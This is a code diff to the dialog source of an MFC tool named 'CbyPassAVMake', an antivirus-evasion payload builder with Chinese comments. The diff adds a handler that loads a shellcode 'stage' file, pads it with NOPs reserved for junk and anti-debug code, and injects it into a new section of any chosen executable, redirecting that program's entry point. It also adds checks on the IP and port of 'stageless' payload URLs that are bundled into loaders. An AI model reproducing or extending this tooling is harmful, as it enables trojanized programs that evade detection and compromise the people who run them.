@@ -80,6 +80,7 @@ BEGIN_MESSAGE_MAP(CbyPassAVMakeDlg, CDialogEx)
 	ON_BN_CLICKED(IDC_BUTTON5, &CbyPassAVMakeDlg::OnBnClickedButton5)
 	ON_BN_CLICKED(IDC_BUTTON6, &CbyPassAVMakeDlg::OnBnClickedButton6)
 	ON_BN_CLICKED(IDC_BUTTON7, &CbyPassAVMakeDlg::OnBnClickedButton7)
+	ON_BN_CLICKED(IDC_BUTTON8, &CbyPassAVMakeDlg::OnBnClickedButton8)
 END_MESSAGE_MAP()
 
 
@@ -501,7 +502,89 @@ void CbyPassAVMakeDlg::ConfusionCodes(STu8 *oricode, STu32 oricodesize, STu8 ** 
 	Assemble(pasm, 0x400000, &am, 0, 0, errtext);
 }
 
-//捆绑stage payload
+//捆绑stage到任意程序
+void CbyPassAVMakeDlg::OnBnClickedButton8()
+{
+	UpdateData(TRUE);
+	CString strName;
+	mSecName.GetWindowText(strName);
+	if (strName.GetLength() == 0)
+	{
+		AfxMessageBox("区段名为空!");
+		return;
+	}
+	//计算花指令，反调试代码预留空间
+	STu32 nopbytes = 0;
+	CString strNopBytes;
+	mCodesLen.GetWindowText(strNopBytes);
+	nopbytes = strtoll(strNopBytes, 0, 0x10);
+
+	//加载bin文件shellcode数据
+	CString binFile = "";
+	mFileBin.GetWindowTextA(binFile);
+	HANDLE mHandle = CreateFile(binFile.GetBuffer(0), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (INVALID_HANDLE_VALUE == mHandle)
+	{
+		AfxMessageBox("stage打开失败!");
+		return;
+	}
+
+	DWORD dwSizeHigh = 0, dwShellCodeSize = 0;
+	dwShellCodeSize = GetFileSize(mHandle, &dwSizeHigh);
+	if (dwShellCodeSize == INVALID_FILE_SIZE || dwSizeHigh != 0)
+	{
+		CloseHandle(mHandle);
+		AfxMessageBox("文件太大!");
+		return;
+	}
+	STu32 dwVirMemSize = dwShellCodeSize + nopbytes;
+	STu8* pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, __int64(dwVirMemSize));
+	if (pVirMem == NULL)
+	{
+		CloseHandle(mHandle);
+		AfxMessageBox("内存分配失败!");
+		return;
+	}
+
+	DWORD readsize;
+	if (!ReadFile(mHandle, pVirMem + nopbytes, dwShellCodeSize, &readsize, NULL))		//跳过nopbytes花指令
+	{
+		CloseHandle(mHandle);
+		AfxMessageBox("文件读取失败!");
+		return;
+	}
+
+	if (readsize != dwShellCodeSize)
+	{
+		CloseHandle(mHandle);
+		AfxMessageBox("文件读取失败!");
+		return;
+	}
+	CloseHandle(mHandle);
+
+	//处理shellcode数据，增加花指令,暂时填充NOP
+	if (nopbytes)
+		memset(pVirMem, 0x90, nopbytes);
+
+	//STu8* shellcode = 0;
+	//STu32 shellcodesize = 0;
+	//ConfusionCodes(pVirMem + nopbytes, dwShellCodeSize, &shellcode, &shellcodesize);
+	//卸载大内存
+	//MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
+
+	//shellcode数据添加到目标程序新区段
+	bool bRet = mPEMake.AddPatchAuto2OEP((STu8*)strName.GetBuffer(0), pVirMem, dwShellCodeSize, 0);
+	if (bRet)
+	{
+		OnSaveAs();
+		//CDialogEx::OnOK();
+	}
+	else
+		CDialogEx::OnCancel();
+
+}
+
+//捆绑stage到加载器
 void CbyPassAVMakeDlg::OnBnClickedButton1()
 {
 	UpdateData(TRUE);
@@ -524,7 +607,7 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 	HANDLE mHandle = CreateFile(binFile.GetBuffer(0), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (INVALID_HANDLE_VALUE == mHandle)
 	{
-		AfxMessageBox("文件打开失败!");
+		AfxMessageBox("stage打开失败!");
 		return;
 	}
 
@@ -639,7 +722,7 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 		CDialogEx::OnCancel();
 }
 
-//捆绑stageless url
+//捆绑stageless url到加载器
 void CbyPassAVMakeDlg::OnBnClickedButton5()
 {
 	UpdateData(TRUE);
@@ -658,6 +741,12 @@ void CbyPassAVMakeDlg::OnBnClickedButton5()
 	mStagelessIP.GetWindowTextA(ip);
 	CString port;
 	mPort.GetWindowTextA(port);
+	if (ip.GetLength() <= 0 || port.GetLength() == 0)
+	{
+		AfxMessageBox("stageless url非法!");
+		return;
+	}
+
 	CStringA _url = "http://" + ip + ":" + port + url;
 	ByteBuffer shellcode;
 	shellcode.append((unsigned char*)(_url.GetBuffer()), _url.GetLength());
@@ -728,7 +817,7 @@ void CbyPassAVMakeDlg::OnBnClickedButton5()
 		CDialogEx::OnCancel();
 }
 
-//加密raw文件
+//分离加密stage文件
 void CbyPassAVMakeDlg::OnBnClickedButton6()
 {
 	//计算花指令，反调试代码预留空间
@@ -857,7 +946,7 @@ void CbyPassAVMakeDlg::OnBnClickedButton6()
 	AfxMessageBox("保存成功");
 }
 
-//加密stageless url
+//分离加密stageless url文件
 void CbyPassAVMakeDlg::OnBnClickedButton7()
 {
 	UpdateData(TRUE);
@@ -878,6 +967,11 @@ void CbyPassAVMakeDlg::OnBnClickedButton7()
 	mStagelessIP.GetWindowTextA(ip);
 	CString port;
 	mPort.GetWindowTextA(port);
+	if (ip.GetLength() <= 0 || port.GetLength() == 0)
+	{
+		AfxMessageBox("stageless url非法!");
+		return;
+	}
 	CStringA _url = "http://" + ip + ":" + port + url;
 	ByteBuffer shellcode;
 	shellcode.append((unsigned char*)(_url.GetBuffer()), _url.GetLength());
@@ -949,7 +1043,6 @@ void CbyPassAVMakeDlg::OnBnClickedButton7()
 	mFile.Close();
 	AfxMessageBox("保存成功");
 }
-
 
 //取消按钮事件
 void CbyPassAVMakeDlg::OnBnClickedButton2()
@@ -1059,5 +1152,4 @@ void CbyPassAVMakeDlg::OnSaveAs()
 	}
 
 }
-
 
